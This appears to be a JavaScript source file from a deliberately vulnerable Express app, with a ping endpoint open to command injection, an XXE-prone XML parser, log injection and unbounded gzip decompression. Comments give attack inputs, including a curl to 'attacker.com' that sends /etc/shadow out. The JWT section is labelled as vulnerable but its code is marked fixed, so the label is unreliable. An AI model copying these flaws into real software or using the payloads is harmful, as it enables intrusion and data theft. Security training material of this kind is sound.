// ============================================================
// VULNERABILITIES #48-52: System Diagnostics & Monitoring
//   #48 Command Injection via ping (CWE-78)
//   #49 XML External Entity Injection (CWE-611)
//   #50 Log Forging / Log Injection (CWE-117)
//   #51 Uncontrolled Resource Consumption - zip bomb (CWE-400)
//   #52 Hardcoded JWT Secret with None Algorithm (CWE-347)
// ============================================================

const express = require('express');
const router = express.Router();
const { execSync } = require('child_process');
const { parseString } = require('xml2js');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const zlib = require('zlib');

// VULN #48: Command Injection (CWE-78)
// User-supplied hostname is passed directly to shell command
// without any sanitization or validation
router.get('/ping', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.status(400).json({ error: 'Host parameter required' });
  }

  try {
    // VULNERABLE: Direct string interpolation into shell command
    // Attacker: /api/diagnostics/ping?host=google.com;cat /etc/passwd
    // Attacker: /api/diagnostics/ping?host=$(whoami)
    // Attacker: /api/diagnostics/ping?host=127.0.0.1 && curl attacker.com/steal?data=$(cat /etc/shadow)
    const output = execSync(`ping -c 3 ${host}`, {
      timeout: 10000,
      encoding: 'utf-8',
    });

    res.json({
      host: host,
      result: output,
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    res.status(500).json({
      error: 'Ping failed',
      details: err.stderr || err.message,
      command: `ping -c 3 ${host}`,  // Leaks the executed command
    });
  }
});

// VULN #49: XML External Entity Injection (CWE-611)
// Parses user-supplied XML without disabling external entities
// Allows reading arbitrary files from the server filesystem
router.post('/health-check', (req, res) => {
  const xmlData = req.body.xml || req.body;

  if (!xmlData || typeof xmlData !== 'string') {
    return res.status(400).json({ error: 'XML body required' });
  }

  // VULNERABLE: XML parsing with external entities enabled by default
  // Attacker sends:
  // <?xml version="1.0"?>
  // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  // <health><service>&xxe;</service></health>
  parseString(xmlData, { explicitArray: false }, (err, result) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid XML', details: err.message });
    }

    res.json({
      parsed: result,
      services_checked: Object.keys(result).length,
      timestamp: new Date().toISOString(),
    });
  });
});

// VULN #50: Log Forging / Log Injection (CWE-117)
// User input written directly to logs without sanitization
// Attacker can inject fake log entries or corrupt log analysis
router.post('/audit-log', (req, res) => {
  const { action, resource, details } = req.body;
  const userAgent = req.headers['user-agent'];
  const clientIp = req.headers['x-forwarded-for'] || req.ip;

  // VULNERABLE: User-controlled values written directly to log
  // Attacker can inject newlines to create fake log entries:
  // action: "login\n[CRITICAL] Admin password changed by root from 10.0.0.1"
  // This corrupts log integrity and can mislead forensic analysis
  const logEntry = `[${new Date().toISOString()}] ACTION=${action} RESOURCE=${resource} IP=${clientIp} UA=${userAgent} DETAILS=${details}`;

  // Write to file without sanitization
  fs.appendFileSync('/tmp/audit.log', logEntry + '\n');
  console.log(logEntry);

  res.json({
    logged: true,
    entry: logEntry,  // Also returns the raw log entry to the attacker
    log_file: '/tmp/audit.log',  // Exposes internal file path
  });
});

// VULN #51: Uncontrolled Resource Consumption (CWE-400)
// Decompresses user-uploaded data without checking decompressed size
// A small gzip "bomb" (e.g., 42.zip) can expand to gigabytes in memory
router.post('/import-config', (req, res) => {
  const compressedData = req.body.data;

  if (!compressedData) {
    return res.status(400).json({ error: 'Compressed config data required' });
  }

  try {
    // VULNERABLE: No size limit on decompressed output
    // A 1KB gzip payload can decompress to 1GB+ (gzip bomb)
    // This will exhaust server memory and crash the process
    const buffer = Buffer.from(compressedData, 'base64');
    const decompressed = zlib.gunzipSync(buffer);

    // Process the entire decompressed content in memory
    const config = JSON.parse(decompressed.toString('utf-8'));

    res.json({
      message: 'Config imported successfully',
      keys: Object.keys(config),
      size_compressed: buffer.length,
      size_decompressed: decompressed.length,
    });
  } catch (err) {
    res.status(400).json({ error: 'Import failed', details: err.message });
  }
});

// VULN #52: JWT Verification with Hardcoded Secret + None Algorithm (CWE-347)
// Uses a strong secret from environment variables AND restricts algorithms
const JWT_SECRET = process.env.JWT_SECRET;

router.post('/verify-token', (req, res) => {
  const { token } = req.body;

  if (!token) {
    return res.status(400).json({ error: 'Token required' });
  }

  if (!JWT_SECRET) {
    // Fail securely if JWT secret is not set
    return res.status(500).json({ error: 'Server configuration error' });
  }

  try {
    // FIXED: Restrict accepted algorithms to HS256 and use secure env var secret
    const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });

    res.json({
      valid: true,
      payload: decoded,
      issued_at: new Date(decoded.iat * 1000).toISOString(),
      expires_at: decoded.exp ? new Date(decoded.exp * 1000).toISOString() : 'never'
      // Removed secret hint to prevent secret leakage
    });
  } catch (err) {
    res.status(401).json({
      valid: false,
      error: err.message,
      algorithm_used: err.message.includes('algorithm') ? 'Check algorithm header' : 'unknown',
    });
  }
});

module.exports = router;